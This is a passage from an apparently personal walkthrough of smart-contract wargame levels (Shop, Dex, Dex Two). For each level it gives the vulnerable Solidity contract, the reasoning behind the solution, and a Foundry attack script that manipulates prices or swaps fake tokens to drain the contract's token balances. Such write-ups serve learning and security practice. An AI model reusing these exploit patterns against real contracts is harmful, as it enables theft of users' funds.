</span><span>      price </span><span style=color:#a71d5d;font-weight:700>= </span><span>_buyer.</span><span style=color:#795da3;font-weight:700>price</span><span>();
</span><span>    }
</span><span>  }
</span><span>}
</span></code></pre><ul><li>Goal</ul><ol><li>an you get the item from the shop for less than the price asked?</ol><ul><li>Solution</ul><ol><li>This is similar to the Elevator challenge. Elevator uses a an external normal function to call.<li>But here <code>price()</code> should a view function. Which shouldn't modify the storage of the contract.<li>So, we cant just keep the number of the calls to the <code>price()</code> function in our Attack contract.<li>We can make use of <code>isSold</code> variable to check that the <code>price()</code> is called or not. This can be acceptable inside a view function.<li>So, I wrote Attack contract with <code>price()</code> function defined as view and it returns two different price values for the initial call and second call.</ol><p><code>ShopSolve.s.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>0</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/Script.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/console.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span>{Shop} </span><span style=color:#a71d5d;font-weight:700>from </span><span style=color:#183691>"../src/Shop.sol"</span><span>;
</span><span>
</span><span>contract ShopSolve is Script{
</span><span>    Shop public shop </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>Shop</span><span>(</span><span style=color:#0086b3>0x45e7A13038eCA7cCfd53aC8C4F345A7bC2fCd2A2</span><span>);
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>run</span><span>() </span><span style=color:#795da3;font-weight:700>external</span><span>{
</span><span>        vm.</span><span style=color:#795da3;font-weight:700>startBroadcast</span><span>(vm.</span><span style=color:#795da3;font-weight:700>envUint</span><span>(</span><span style=color:#183691>"PRIVATE_KEY"</span><span>));
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"is Sold : "</span><span>, shop.</span><span style=color:#795da3;font-weight:700>isSold</span><span>());
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>new </span><span>Attack().</span><span style=color:#795da3;font-weight:700>exploit</span><span>();
</span><span>
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"is Sold : "</span><span>, shop.</span><span style=color:#795da3;font-weight:700>isSold</span><span>());        
</span><span>        vm.</span><span style=color:#795da3;font-weight:700>stopBroadcast</span><span>();
</span><span>    }
</span><span>}
</span><span>
</span><span>contract Attack{
</span><span>    Shop public shop </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>Shop</span><span>(</span><span style=color:#0086b3>0x45e7A13038eCA7cCfd53aC8C4F345A7bC2fCd2A2</span><span>);
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>exploit</span><span>() </span><span style=color:#795da3;font-weight:700>public </span><span>{
</span><span>        shop.</span><span style=color:#795da3;font-weight:700>buy</span><span>();
</span><span>    }
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>price</span><span>() </span><span style=color:#795da3;font-weight:700>external view returns </span><span>(uint){
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if</span><span>(shop.</span><span style=color:#795da3;font-weight:700>isSold</span><span>() </span><span style=color:#a71d5d;font-weight:700>== </span><span style=color:#0086b3>false</span><span>){
</span><span>            </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#0086b3>100</span><span>;
</span><span>        }
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#0086b3>1</span><span>;
</span><span>    }
</span><span>}
</span></code></pre><p>To run script :<pre class=language-bash data-lang=bash style=color:#323232;background-color:#fff><code class=language-bash data-lang=bash><span>$ source .env
</span><span>$ forge script script/ShopSolve.s.sol:ShopSolve --rpc-url $RPC_URL --broadcast
</span></code></pre><h1 id=22-dex>22 Dex</h1><p><code>Dex.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>0</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"openzeppelin-contracts/contracts/token/ERC20/IERC20.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"openzeppelin-contracts/contracts/token/ERC20/ERC20.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>'openzeppelin-contracts/contracts/access/Ownable.sol'</span><span>;
</span><span>
</span><span>contract Dex is </span><span style=color:#795da3;font-weight:700>Ownable</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(</span><span style=color:#0086b3>0x00</span><span>)) {
</span><span>  address public token1;
</span><span>  address public token2;
</span><span>  </span><span style=color:#795da3;font-weight:700>constructor</span><span>() {}
</span><span>
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>setTokens</span><span>(address _token1, address _token2) </span><span style=color:#795da3;font-weight:700>public onlyOwner </span><span>{
</span><span>    token1 </span><span style=color:#a71d5d;font-weight:700>= </span><span>_token1;
</span><span>    token2 </span><span style=color:#a71d5d;font-weight:700>= </span><span>_token2;
</span><span>  }
</span><span>  
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>addLiquidity</span><span>(address token_address, uint amount) </span><span style=color:#795da3;font-weight:700>public onlyOwner </span><span>{
</span><span>    </span><span style=color:#795da3;font-weight:700>IERC20</span><span>(token_address).</span><span style=color:#795da3;font-weight:700>transferFrom</span><span>(msg.sender, </span><span style=color:#795da3;font-weight:700>address</span><span>(this), amount);
</span><span>  }
</span><span>  
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>swap</span><span>(address from, address to, uint amount) </span><span style=color:#795da3;font-weight:700>public </span><span>{
</span><span>    </span><span style=color:#62a35c>require</span><span>((from </span><span style=color:#a71d5d;font-weight:700>== </span><span>token1 </span><span style=color:#a71d5d;font-weight:700>&& </span><span>to </span><span style=color:#a71d5d;font-weight:700>== </span><span>token2) </span><span style=color:#a71d5d;font-weight:700>|| </span><span>(from </span><span style=color:#a71d5d;font-weight:700>== </span><span>token2 </span><span style=color:#a71d5d;font-weight:700>&& </span><span>to </span><span style=color:#a71d5d;font-weight:700>== </span><span>token1), </span><span style=color:#183691>"Invalid tokens"</span><span>);
</span><span>    </span><span style=color:#62a35c>require</span><span>(</span><span style=color:#795da3;font-weight:700>IERC20</span><span>(from).</span><span style=color:#795da3;font-weight:700>balanceOf</span><span>(msg.sender) </span><span style=color:#a71d5d;font-weight:700>>= </span><span>amount, </span><span style=color:#183691>"Not enough to swap"</span><span>);
</span><span>    uint swapAmount </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>getSwapPrice</span><span>(from, to, amount);
</span><span>    </span><span style=color:#795da3;font-weight:700>IERC20</span><span>(from).</span><span style=color:#795da3;font-weight:700>transferFrom</span><span>(msg.sender, </span><span style=color:#795da3;font-weight:700>address</span><span>(this), amount);
</span><span>    </span><span style=color:#795da3;font-weight:700>IERC20</span><span>(to).</span><span style=color:#795da3;font-weight:700>approve</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(this), swapAmount);
</span><span>    </span><span style=color:#795da3;font-weight:700>IERC20</span><span>(to).</span><span style=color:#795da3;font-weight:700>transferFrom</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(this), msg.sender, swapAmount);
</span><span>  }
</span><span>
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>getSwapPrice</span><span>(address from, address to, uint amount) </span><span style=color:#795da3;font-weight:700>public view returns</span><span>(uint){
</span><span>    </span><span style=color:#a71d5d;font-weight:700>return</span><span>((amount </span><span style=color:#a71d5d;font-weight:700>* </span><span style=color:#795da3;font-weight:700>IERC20</span><span>(to).</span><span style=color:#795da3;font-weight:700>balanceOf</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(this)))</span><span style=color:#a71d5d;font-weight:700>/</span><span style=color:#795da3;font-weight:700>IERC20</span><span>(from).</span><span style=color:#795da3;font-weight:700>balanceOf</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(this)));
</span><span>  }
</span><span>
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>approve</span><span>(address spender, uint amount) </span><span style=color:#795da3;font-weight:700>public </span><span>{
</span><span>    </span><span style=color:#795da3;font-weight:700>SwappableToken</span><span>(token1).</span><span style=color:#795da3;font-weight:700>approve</span><span>(msg.sender, spender, amount);
</span><span>    </span><span style=color:#795da3;font-weight:700>SwappableToken</span><span>(token2).</span><span style=color:#795da3;font-weight:700>approve</span><span>(msg.sender, spender, amount);
</span><span>  }
</span><span>
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>balanceOf</span><span>(address token, address account) </span><span style=color:#795da3;font-weight:700>public view returns </span><span>(uint){
</span><span>    </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#795da3;font-weight:700>IERC20</span><span>(token).</span><span style=color:#795da3;font-weight:700>balanceOf</span><span>(account);
</span><span>  }
</span><span>}
</span><span>
</span><span>contract SwappableToken is </span><span style=color:#0086b3>ERC20 </span><span>{
</span><span>  address private _dex;
</span><span>  </span><span style=color:#795da3;font-weight:700>constructor</span><span>(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) </span><span style=color:#795da3;font-weight:700>ERC20</span><span>(name, symbol) {
</span><span>        </span><span style=color:#795da3;font-weight:700>_mint</span><span>(msg.sender, initialSupply);
</span><span>        _dex </span><span style=color:#a71d5d;font-weight:700>= </span><span>dexInstance;
</span><span>  }
</span><span>
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>approve</span><span>(address owner, address spender, uint256 amount) </span><span style=color:#795da3;font-weight:700>public </span><span>{
</span><span>    </span><span style=color:#62a35c>require</span><span>(owner </span><span style=color:#a71d5d;font-weight:700>!= </span><span>_dex, </span><span style=color:#183691>"InvalidApprover"</span><span>);
</span><span>    super.</span><span style=color:#795da3;font-weight:700>_approve</span><span>(owner, spender, amount);
</span><span>  }
</span><span>}
</span></code></pre><ul><li>Goal</ul><ol><li>The goal of this level is for you to hack the basic DEX contract and steal the funds by price manipulation.<li>You will be successful in this level if you manage to drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a "bad" price of the assets.</ol><ul><li>Solution</ul><ol><li>You will start with 10 tokens of token1 and 10 of token2. The DEX contract starts with 100 of each token.<li>There is a <code>swap()</code> function inside Dex contract which swaps one token for another. Inside <code>swap()</code> intially two basic checks have been done to check for that the tokens are valid or not. And for the balance of the sender.<li>Observe that the <code>getSwapPrice()</code> is used to get the amount of tokens to be transferred to the <code>to</code> address.</ol><pre style=color:#323232;background-color:#fff><code><span>  uint swapAmount = getSwapPrice(from, to, amount);
</span><span>  IERC20(from).transferFrom(msg.sender, address(this), amount);
</span><span>  IERC20(to).approve(address(this), swapAmount);
</span><span>  IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
</span></code></pre><ol start=4><li><p>The <code>amount</code> is the amount of the tokens that added to the balance of <code>Dex</code> contract.</p><li><p><code>swapAmount</code> is the amount of tokens that goes to the <code>to</code> address from the balance of the <code>Dex</code> contract.</p><li><p>I tried calculating for swapAmout to find is there any chance that happens for the <code>swapAmount > amount</code>. So, that the <code>to</code> address will get more tokens than they sent.</p><li><p>I have observed that swapping between two tokens slightly increases the balance of the <code>to</code> address.</p> <pre style=color:#323232;background-color:#fff><code><span> swap(token1, token2, 10)  
</span><span>   swapAmount = (10 * 100)//100 = 10
</span><span>   ==>  balance of player in token1 = 10 - amount = 0
</span><span>   ==>  balance of player in token2 = 10 + swapAmount = 20
</span><span> 
</span><span>   ==>  balance of Dex in token1 = 110
</span><span>   ==>  balance of Dex in token2 = 100 - swapAmount = 90
</span><span>
</span><span> swap(token2, token1, 20) 
</span><span>   swapAmount  = (20 * 110) // 90 = 24
</span><span>   ==>  balance of player in token2 = 20 - amount = 0
</span><span>   ==>  balance of player in token1 = 0 + swapAmount = 24
</span><span> 
</span><span>   ==>  balance of Dex in token2 = 90 + amount
</span><span>   ==>  balance of Dex in token1 = 110 - swapAmount = 110 - 24 = 86
</span></code></pre><li><p>Here you can see that the after each swap <code>swapAmount</code> is becoming greater than the amount the comes in.</p><li><p>After doing 5 swaps we need to do 45 amount of tokens swap from token2 to token1 which will make token2 balance of <code>Dex</code> zero.</p></ol><p><code>DexSolve.s.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>0</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/Script.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/console.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span>{Dex} </span><span style=color:#a71d5d;font-weight:700>from </span><span style=color:#183691>"../src/Dex.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"openzeppelin-contracts/contracts/token/ERC20/IERC20.sol"</span><span>;
</span><span>
</span><span>contract DexSolve is Script{
</span><span>    Dex public dex </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>Dex</span><span>(</span><span style=color:#0086b3>0x13dC383F59782676f31c55baa715C6F24E4d8CF5</span><span>);
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>run</span><span>() </span><span style=color:#795da3;font-weight:700>external</span><span>{
</span><span>        vm.</span><span style=color:#795da3;font-weight:700>startBroadcast</span><span>(vm.</span><span style=color:#795da3;font-weight:700>envUint</span><span>(</span><span style=color:#183691>"PRIVATE_KEY"</span><span>));
</span><span>
</span><span>        address token1 </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>address</span><span>(dex.</span><span style=color:#795da3;font-weight:700>token1</span><span>());
</span><span>        address token2 </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>address</span><span>(dex.</span><span style=color:#795da3;font-weight:700>token2</span><span>());
</span><span>
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Token 1 : "</span><span>, token1);
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Token 2 : "</span><span>, token2);
</span><span>
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"DEX balance in TOKEN1 "</span><span>, dex.</span><span style=color:#795da3;font-weight:700>balanceOf</span><span>(token1, </span><span style=color:#795da3;font-weight:700>address</span><span>(dex)));
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"DEX balance in TOKEN2 "</span><span>, dex.</span><span style=color:#795da3;font-weight:700>balanceOf</span><span>(token2, </span><span style=color:#795da3;font-weight:700>address</span><span>(dex)));
</span><span>
</span><span>        Attack attack </span><span style=color:#a71d5d;font-weight:700>= new </span><span>Attack();
</span><span>        
</span><span>        dex.</span><span style=color:#795da3;font-weight:700>approve</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(attack), </span><span style=color:#0086b3>10</span><span>);
</span><span>
</span><span>        attack.</span><span style=color:#795da3;font-weight:700>exploit</span><span>();
</span><span>
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Attacker balance in TOKEN1 "</span><span>, dex.</span><span style=color:#795da3;font-weight:700>balanceOf</span><span>(token1, </span><span style=color:#795da3;font-weight:700>address</span><span>(attack)));
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Attacker balance in TOKEN2 "</span><span>, dex.</span><span style=color:#795da3;font-weight:700>balanceOf</span><span>(token2, </span><span style=color:#795da3;font-weight:700>address</span><span>(attack)));
</span><span>
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"DEX balance in TOKEN1 "</span><span>, dex.</span><span style=color:#795da3;font-weight:700>balanceOf</span><span>(token1, </span><span style=color:#795da3;font-weight:700>address</span><span>(dex)));
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"DEX balance in TOKEN2 "</span><span>, dex.</span><span style=color:#795da3;font-weight:700>balanceOf</span><span>(token2, </span><span style=color:#795da3;font-weight:700>address</span><span>(dex)));
</span><span>        vm.</span><span style=color:#795da3;font-weight:700>stopBroadcast</span><span>();
</span><span>    }
</span><span>}
</span><span>
</span><span>contract Attack{
</span><span>    Dex public dex </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>Dex</span><span>(</span><span style=color:#0086b3>0x13dC383F59782676f31c55baa715C6F24E4d8CF5</span><span>);
</span><span>    address token1 </span><span style=color:#a71d5d;font-weight:700>= </span><span>dex.</span><span style=color:#795da3;font-weight:700>token1</span><span>();
</span><span>    address token2 </span><span style=color:#a71d5d;font-weight:700>= </span><span>dex.</span><span style=color:#795da3;font-weight:700>token2</span><span>();
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>exploit</span><span>() </span><span style=color:#795da3;font-weight:700>public</span><span>{
</span><span>        </span><span style=color:#795da3;font-weight:700>IERC20</span><span>(token1).</span><span style=color:#795da3;font-weight:700>transferFrom</span><span>(</span><span style=color:#0086b3>0x699BceEbD59a5b52bB586C737cD7ba636f3Fe602</span><span>, </span><span style=color:#795da3;font-weight:700>address</span><span>(this), </span><span style=color:#0086b3>10</span><span>);
</span><span>        </span><span style=color:#795da3;font-weight:700>IERC20</span><span>(token2).</span><span style=color:#795da3;font-weight:700>transferFrom</span><span>(</span><span style=color:#0086b3>0x699BceEbD59a5b52bB586C737cD7ba636f3Fe602</span><span>, </span><span style=color:#795da3;font-weight:700>address</span><span>(this), </span><span style=color:#0086b3>10</span><span>);
</span><span>        
</span><span>        dex.</span><span style=color:#795da3;font-weight:700>approve</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(dex), </span><span style=color:#795da3;font-weight:700>type</span><span>(uint64).max);
</span><span>
</span><span>        dex.</span><span style=color:#795da3;font-weight:700>swap</span><span>(token1, token2, dex.</span><span style=color:#795da3;font-weight:700>balanceOf</span><span>(token1, </span><span style=color:#795da3;font-weight:700>address</span><span>(this)));
</span><span>        dex.</span><span style=color:#795da3;font-weight:700>swap</span><span>(token2, token1, dex.</span><span style=color:#795da3;font-weight:700>balanceOf</span><span>(token2, </span><span style=color:#795da3;font-weight:700>address</span><span>(this)));
</span><span>        dex.</span><span style=color:#795da3;font-weight:700>swap</span><span>(token1, token2, dex.</span><span style=color:#795da3;font-weight:700>balanceOf</span><span>(token1, </span><span style=color:#795da3;font-weight:700>address</span><span>(this)));
</span><span>        dex.</span><span style=color:#795da3;font-weight:700>swap</span><span>(token2, token1, dex.</span><span style=color:#795da3;font-weight:700>balanceOf</span><span>(token2, </span><span style=color:#795da3;font-weight:700>address</span><span>(this)));
</span><span>        dex.</span><span style=color:#795da3;font-weight:700>swap</span><span>(token1, token2, dex.</span><span style=color:#795da3;font-weight:700>balanceOf</span><span>(token1, </span><span style=color:#795da3;font-weight:700>address</span><span>(this)));
</span><span>
</span><span>        dex.</span><span style=color:#795da3;font-weight:700>swap</span><span>(token2, token1, </span><span style=color:#0086b3>45</span><span>);        
</span><span>    }
</span><span>}
</span></code></pre><p>To run script :<pre class=language-bash data-lang=bash style=color:#323232;background-color:#fff><code class=language-bash data-lang=bash><span>$ source .env
</span><span>$ forge script script/DexSolve.s.sol:DexSolve --rpc-url $RPC_URL --broadcast
</span></code></pre><h1 id=23-dex-two>23 Dex Two</h1><p><code>DexTwo.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>0</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"openzeppelin-contracts/contracts/token/ERC20/IERC20.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"openzeppelin-contracts/contracts/token/ERC20/ERC20.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>'openzeppelin-contracts/contracts/access/Ownable.sol'</span><span>;
</span><span>
</span><span>contract DexTwo is </span><span style=color:#795da3;font-weight:700>Ownable</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(</span><span style=color:#0086b3>0x00</span><span>)) {
</span><span>  address public token1;
</span><span>  address public token2;
</span><span>  </span><span style=color:#795da3;font-weight:700>constructor</span><span>() {}
</span><span>
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>setTokens</span><span>(address _token1, address _token2) </span><span style=color:#795da3;font-weight:700>public onlyOwner </span><span>{
</span><span>    token1 </span><span style=color:#a71d5d;font-weight:700>= </span><span>_token1;
</span><span>    token2 </span><span style=color:#a71d5d;font-weight:700>= </span><span>_token2;
</span><span>  }
</span><span>
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>add_liquidity</span><span>(address token_address, uint amount) </span><span style=color:#795da3;font-weight:700>public onlyOwner </span><span>{
</span><span>    </span><span style=color:#795da3;font-weight:700>IERC20</span><span>(token_address).</span><span style=color:#795da3;font-weight:700>transferFrom</span><span>(msg.sender, </span><span style=color:#795da3;font-weight:700>address</span><span>(this), amount);
</span><span>  }
</span><span>  
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>swap</span><span>(address from, address to, uint amount) </span><span style=color:#795da3;font-weight:700>public </span><span>{
</span><span>    </span><span style=color:#62a35c>require</span><span>(</span><span style=color:#795da3;font-weight:700>IERC20</span><span>(from).</span><span style=color:#795da3;font-weight:700>balanceOf</span><span>(msg.sender) </span><span style=color:#a71d5d;font-weight:700>>= </span><span>amount, </span><span style=color:#183691>"Not enough to swap"</span><span>);
</span><span>    uint swapAmount </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>getSwapAmount</span><span>(from, to, amount);
</span><span>    </span><span style=color:#795da3;font-weight:700>IERC20</span><span>(from).</span><span style=color:#795da3;font-weight:700>transferFrom</span><span>(msg.sender, </span><span style=color:#795da3;font-weight:700>address</span><span>(this), amount);
</span><span>    </span><span style=color:#795da3;font-weight:700>IERC20</span><span>(to).</span><span style=color:#795da3;font-weight:700>approve</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(this), swapAmount);
</span><span>    </span><span style=color:#795da3;font-weight:700>IERC20</span><span>(to).</span><span style=color:#795da3;font-weight:700>transferFrom</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(this), msg.sender, swapAmount);
</span><span>  } 
</span><span>
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>getSwapAmount</span><span>(address from, address to, uint amount) </span><span style=color:#795da3;font-weight:700>public view returns</span><span>(uint){
</span><span>    </span><span style=color:#a71d5d;font-weight:700>return</span><span>((amount </span><span style=color:#a71d5d;font-weight:700>* </span><span style=color:#795da3;font-weight:700>IERC20</span><span>(to).</span><span style=color:#795da3;font-weight:700>balanceOf</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(this)))</span><span style=color:#a71d5d;font-weight:700>/</span><span style=color:#795da3;font-weight:700>IERC20</span><span>(from).</span><span style=color:#795da3;font-weight:700>balanceOf</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(this)));
</span><span>  }
</span><span>
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>approve</span><span>(address spender, uint amount) </span><span style=color:#795da3;font-weight:700>public </span><span>{
</span><span>    </span><span style=color:#795da3;font-weight:700>SwappableTokenTwo</span><span>(token1).</span><span style=color:#795da3;font-weight:700>approve</span><span>(msg.sender, spender, amount);
</span><span>    </span><span style=color:#795da3;font-weight:700>SwappableTokenTwo</span><span>(token2).</span><span style=color:#795da3;font-weight:700>approve</span><span>(msg.sender, spender, amount);
</span><span>  }
</span><span>
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>balanceOf</span><span>(address token, address account) </span><span style=color:#795da3;font-weight:700>public view returns </span><span>(uint){
</span><span>    </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#795da3;font-weight:700>IERC20</span><span>(token).</span><span style=color:#795da3;font-weight:700>balanceOf</span><span>(account);
</span><span>  }
</span><span>}
</span><span>
</span><span>contract SwappableTokenTwo is </span><span style=color:#0086b3>ERC20 </span><span>{
</span><span>  address private _dex;
</span><span>  </span><span style=color:#795da3;font-weight:700>constructor</span><span>(address dexInstance, string memory name, string memory symbol, uint initialSupply) </span><span style=color:#795da3;font-weight:700>ERC20</span><span>(name, symbol) {
</span><span>        </span><span style=color:#795da3;font-weight:700>_mint</span><span>(msg.sender, initialSupply);
</span><span>        _dex </span><span style=color:#a71d5d;font-weight:700>= </span><span>dexInstance;
</span><span>  }
</span><span>
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>approve</span><span>(address owner, address spender, uint256 amount) </span><span style=color:#795da3;font-weight:700>public </span><span>{
</span><span>    </span><span style=color:#62a35c>require</span><span>(owner </span><span style=color:#a71d5d;font-weight:700>!= </span><span>_dex, </span><span style=color:#183691>"InvalidApprover"</span><span>);
</span><span>    super.</span><span style=color:#795da3;font-weight:700>_approve</span><span>(owner, spender, amount);
</span><span>  }
</span><span>}
</span></code></pre><ul><li>Goal</ul><ol><li>You need to drain all balances of token1 and token2 from the DexTwo contract to succeed in this level.</ol><ul><li>Solution</ul><ol><li>Observe that the <code>DexTwo</code> modifies the <code>swap()</code> function from the <code>Dex</code>. It removed the check of valid tokens.<li>So, we are now allowed to input any token addresses to the swap() function.<li>I created two Fake Tokens and transferred 100 tokens each of the two tokens to the <code>Dex</code> address.<li>I swapped my fake tokens with the <code>token1</code> and <code>token2</code> balances of the <code>Dex</code> contract.</ol><p><code>DexTwoSolve.s.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>0</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/Script.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/console.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span>{Dex} </span><span style=color:#a71d5d;font-weight:700>from </span><span style=color:#183691>"../src/Dex.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"openzeppelin-contracts/contracts/token/ERC20/IERC20.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"openzeppelin-contracts/contracts/token/ERC20/ERC20.sol"</span><span>;
</span><span>
</span><span>
</span><span>
</span><span>contract DexTwoSolve is Script{
</span><span>    Dex public dex </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>Dex</span><span>(</span><span style=color:#0086b3>0xd8c665Dac001720A9efa0f478e63CABc5D64E9e9</span><span>);
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>run</span><span>() </span><span style=color:#795da3;font-weight:700>external</span><span>{
</span><span>        vm.</span><span style=color:#795da3;font-weight:700>startBroadcast</span><span>(vm.</span><span style=color:#795da3;font-weight:700>envUint</span><span>(</span><span style=color:#183691>"PRIVATE_KEY"</span><span>));
</span><span>
</span><span>        address token1 </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>address</span><span>(dex.</span><span style=color:#795da3;font-weight:700>token1</span><span>());
</span><span>        address token2 </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>address</span><span>(dex.</span><span style=color:#795da3;font-weight:700>token2</span><span>());
</span><span>
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Token 1 : "</span><span>, token1);
